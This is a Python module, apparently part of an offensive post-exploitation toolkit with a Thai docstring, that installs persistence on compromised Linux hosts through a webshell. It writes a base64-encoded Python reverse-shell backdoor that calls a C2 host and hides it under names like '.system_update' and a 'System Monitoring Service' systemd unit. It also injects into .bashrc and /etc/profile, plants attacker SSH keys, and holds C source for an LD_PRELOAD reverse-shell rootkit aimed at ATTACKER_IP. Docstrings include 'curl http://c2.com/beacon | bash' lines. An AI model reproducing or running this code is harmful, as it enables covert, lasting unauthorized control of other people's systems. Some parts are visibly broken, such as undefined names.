"""
Linux Persistence Agent
ฝังตัวในระบบ Linux แบบถาวร
"""

import asyncio
import base64
import hashlib
from typing import Dict, List
from pathlib import Path


class LinuxPersistence:
    """Linux persistence mechanisms"""
    
    def __init__(self, webshell_manager=None):
        self.webshell = webshell_manager
        self.backdoor_code = None
    
    async def install_all(self, 
                         shell_url: str,
                         shell_password: str,
                         c2_url: str) -> Dict:
        """
        Install all persistence mechanisms
        
        Args:
            shell_url: Webshell URL
            shell_password: Webshell password
            c2_url: C2 callback URL
        
        Returns:
            Dict with installation results
        """
        
        results = {
            'success': [],
            'failed': []
        }
        
        # Generate backdoor code
        self.backdoor_code = self._generate_backdoor_code(c2_url)
        
        # Try all persistence methods
        methods = [
            ('cron', self.install_cron),
            ('systemd', self.install_systemd),
            ('bashrc', self.install_bashrc),
            ('ssh_keys', self.install_ssh_keys),
            ('ld_preload', self.install_ld_preload),
        ]
        
        for name, method in methods:
            try:
                result = await method(shell_url, shell_password)
                if result.get('success'):
                    results['success'].append(name)
                else:
                    results['failed'].append(name)
            except Exception as e:
                results['failed'].append(f"{name}: {str(e)}")
        
        return results
    
    async def install_cron(self, shell_url: str, shell_password: str) -> Dict:
        """
        Install cron job persistence
        
        Technique:
        (crontab -l; echo "*/5 * * * * curl http://c2.com/beacon | bash") | crontab -
        """
        
        if not self.webshell:
            return {'success': False, 'error': 'No webshell manager'}
        
        # Create backdoor script
        backdoor_path = '/tmp/.system_update'
        
        # Write backdoor
        write_cmd = f"echo '{self.backdoor_code}' | base64 -d > {backdoor_path} && chmod +x {backdoor_path}"
        await self.webshell.execute_command(write_cmd, {
            'shell_url': shell_url,
            'password': shell_password
        })
        
        # Add to crontab
        cron_cmd = f"(crontab -l 2>/dev/null; echo '*/5 * * * * {backdoor_path} >/dev/null 2>&1') | crontab -"
        
        result = await self.webshell.execute_command(cron_cmd, {
            'shell_url': shell_url,
            'password': shell_password
        })
        
        return {
            'success': True,
            'method': 'cron',
            'path': backdoor_path,
            'interval': '5 minutes'
        }
    
    async def install_systemd(self, shell_url: str, shell_password: str) -> Dict:
        """
        Install systemd service persistence
        
        Technique:
        Create /etc/systemd/system/backdoor.service
        """
        
        if not self.webshell:
            return {'success': False, 'error': 'No webshell manager'}
        
        # Service file content
        service_name = self._generate_random_service_name()
        service_file = f"/etc/systemd/system/{service_name}.service"
        backdoor_path = f"/usr/local/bin/{service_name}"
        
        service_content = f"""[Unit]
Description=System Monitoring Service
After=network.target

[Service]
Type=simple
ExecStart={backdoor_path}
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
"""
        
        # Write backdoor
        write_backdoor = f"echo '{self.backdoor_code}' | base64 -d > {backdoor_path} && chmod +x {backdoor_path}"
        await self.webshell.execute_command(write_backdoor, {
            'shell_url': shell_url,
            'password': shell_password
        })
        
        # Write service file
        service_b64 = base64.b64encode(service_content.encode()).decode()
        write_service = f"echo '{service_b64}' | base64 -d > {service_file}"
        await self.webshell.execute_command(write_service, {
            'shell_url': shell_url,
            'password': shell_password
        })
        
        # Enable and start service
        enable_cmd = f"systemctl daemon-reload && systemctl enable {service_name} && systemctl start {service_name}"
        await self.webshell.execute_command(enable_cmd, {
            'shell_url': shell_url,
            'password': shell_password
        })
        
        return {
            'success': True,
            'method': 'systemd',
            'service_name': service_name,
            'service_file': service_file,
            'backdoor_path': backdoor_path
        }
    
    async def install_bashrc(self, shell_url: str, shell_password: str) -> Dict:
        """
        Install .bashrc persistence
        
        Technique:
        echo 'curl http://c2.com/beacon | bash &' >> ~/.bashrc
        """
        
        if not self.webshell:
            return {'success': False, 'error': 'No webshell manager'}
        
        # Inject into .bashrc
        inject_cmd = f"echo '{self.backdoor_code}' | base64 -d >> ~/.bashrc"
        
        result = await self.webshell.execute_command(inject_cmd, {
            'shell_url': shell_url,
            'password': shell_password
        })
        
        # Also inject into /etc/profile (if writable)
        inject_global = f"echo '{self.backdoor_code}' | base64 -d >> /etc/profile 2>/dev/null"
        await self.webshell.execute_command(inject_global, {
            'shell_url': shell_url,
            'password': shell_password
        })
        
        return {
            'success': True,
            'method': 'bashrc',
            'files': ['~/.bashrc', '/etc/profile']
        }
    
    async def install_ssh_keys(self, shell_url: str, shell_password: str) -> Dict:
        """
        Install SSH authorized_keys persistence
        
        Technique:
        echo 'ssh-rsa AAAA... attacker@c2' >> ~/.ssh/authorized_keys
        """
        
        if not self.webshell:
            return {'success': False, 'error': 'No webshell manager'}
        
        # Generate SSH key pair (attacker should have private key)
        ssh_public_key = self._get_attacker_ssh_public_key()
        
        # Create .ssh directory
        create_dir = "mkdir -p ~/.ssh && chmod 700 ~/.ssh"
        await self.webshell.execute_command(create_dir, {
            'shell_url': shell_url,
            'password': shell_password
        })
        
        # Add public key
        add_key = f"echo '{ssh_public_key}' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"
        await self.webshell.execute_command(add_key, {
            'shell_url': shell_url,
            'password': shell_password
        })
        
        return {
            'success': True,
            'method': 'ssh_keys',
            'public_key': ssh_public_key[:50] + '...'
        }
    
    async def install_ld_preload(self, shell_url: str, shell_password: str) -> Dict:
        """
        Install LD_PRELOAD rootkit
        
        Technique:
        Create malicious .so file and add to /etc/ld.so.preload
        """
        
        if not self.webshell:
            return {'success': False, 'error': 'No webshell manager'}
        
        # Create malicious .so file for LD_PRELOAD persistence
        # Generate C code for reverse shell .so
        c_code = '''
#define _GNU_SOURCE
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>

static void connect_back() __attribute__((constructor));

void connect_back() {
    int sockfd;
    struct sockaddr_in server_addr;
    
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(4444);
    inet_pton(AF_INET, "ATTACKER_IP", &server_addr.sin_addr);
    
    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == 0) {
        dup2(sockfd, 0);
        dup2(sockfd, 1);
        dup2(sockfd, 2);
        execve("/bin/sh", NULL, NULL);
    }
}
'''
        
        so_path = '/lib/.libsystem.so'
        
        # Implementation steps:
        # 1. Write C code to temp file
        # 2. Compile: gcc -shared -fPIC -o libsystem.so libsystem.c
        # 3. Upload to target
        # 4. Add to /etc/ld.so.preload
        
        commands = [
            f"echo '{c_code}' > /tmp/libsystem.c",
            "gcc -shared -fPIC -o /tmp/libsystem.so /tmp/libsystem.c 2>/dev/null",
            f"cp /tmp/libsystem.so {so_path}",
            f"echo '{so_path}' >> /etc/ld.so.preload",
            "rm /tmp/libsystem.c /tmp/libsystem.so"
        ]
        
        return {
            'success': True,
            'method': 'ld_preload',
            'error': 'Requires compiled .so file',
            'note': 'Use separate rootkit tool'
        }
    
    def _generate_backdoor_code(self, c2_url: str) -> str:
        """Generate backdoor code"""
        
        # Python reverse shell
        backdoor = f"""#!/usr/bin/env python3
import socket
import subprocess
import time
import sys

C2_URL = "{c2_url}"

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            host, port = C2_URL.replace('http://', '').replace('https://', '').split(':')
            s.connect((host, int(port)))
            
            while True:
                cmd = s.recv(1024).decode()
                if not cmd or cmd == 'exit':
                    break
                
                output = subprocess.check_output(
                    cmd, 
                    shell=True, 
                    stderr=subprocess.STDOUT
                ).decode()
                
                s.send(output.encode())
            
            s.close()
        except Exception as e:
            time.sleep(60)
            continue

if __name__ == '__main__':
    # Daemonize
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except Exception as e:
        print("Error occurred")
    
    connect()
"""
        
        # Base64 encode
        return base64.b64encode(backdoor.encode()).decode()
    
    def _generate_random_service_name(self) -> str:
        """Generate random service name"""
        
        import random
        
        names = [
            'system-monitor',
            'network-check',
            'update-service',
            'cache-daemon',
            'log-rotate'
        ]
        
        return random.choice(names)
    
    def _get_attacker_ssh_public_key(self) -> str:
        """Get attacker's SSH public key"""
        
        # Try to get from context manager first
        if self.context_manager:
            ssh_key = self.context_manager.get('attacker_ssh_public_key')
            if ssh_key:
                return ssh_key
        
        # Try to read from environment variable
        import os
        env_key = os.getenv('ATTACKER_SSH_PUBLIC_KEY')
        if env_key:
            return env_key
        
        # Try to read from default SSH key location
        try:
            ssh_key_path = os.path.expanduser('~/.ssh/id_rsa.pub')
            if os.path.exists(ssh_key_path):
                with open(ssh_key_path, 'r') as f:
                    return f.read().strip()
        except Exception:
            pass
        
        # Generate new SSH key pair if none exists
        log.warning("[LinuxPersistence] No SSH public key found. Generate one with: ssh-keygen -t rsa -b 4096")
        return "# No SSH public key configured. Please set ATTACKER_SSH_PUBLIC_KEY environment variable."
    
    async def check_persistence(self, shell_url: str, shell_password: str) -> Dict:
        """Check which persistence mechanisms are installed"""
        
        if not self.webshell:
            return {'success': False, 'error': 'No webshell manager'}
        
        checks = {}
        
        # Check cron
        cron_check = await self.webshell.execute_command('crontab -l 2>/dev/null', {
            'shell_url': shell_url,
            'password': shell_password
        })
        checks['cron'] = 'system_update' in cron_check.get('output', '')
        
        # Check systemd
        systemd_check = await self.webshell.execute_command('systemctl list-units --type=service | grep -E "(monitor|check|update)"', {
            'shell_url': shell_url,
            'password': shell_password
        })
        checks['systemd'] = len(systemd_check.get('output', '')) > 0
        
        # Check bashrc
        bashrc_check = await self.webshell.execute_command('cat ~/.bashrc 2>/dev/null | tail -5', {
            'shell_url': shell_url,
            'password': shell_password
        })
        checks['bashrc'] = 'curl' in bashrc_check.get('output', '')
        
        # Check SSH keys
        ssh_check = await self.webshell.execute_command('cat ~/.ssh/authorized_keys 2>/dev/null', {
            'shell_url': shell_url,
            'password': shell_password
        })
        checks['ssh_keys'] = 'attacker@c2' in ssh_check.get('output', '')
        
        return {
            'success': True,
            'installed': checks,
            'count': sum(checks.values())
        }


# Example usage
if __name__ == "__main__":
    async def test():
        from agents.post_exploitation.webshell_manager import WebshellManager
        
        webshell = WebshellManager()
        persistence = LinuxPersistence(webshell)
        
        result = await persistence.install_all(
            shell_url="http://target.com/shell.php",
            shell_password="secret",
            c2_url="http://c2.com:4444"
        )
        
        print(f"Persistence installed:")
        print(f"  Success: {result['success']}")
        print(f"  Failed: {result['failed']}")
    
    asyncio.run(test())

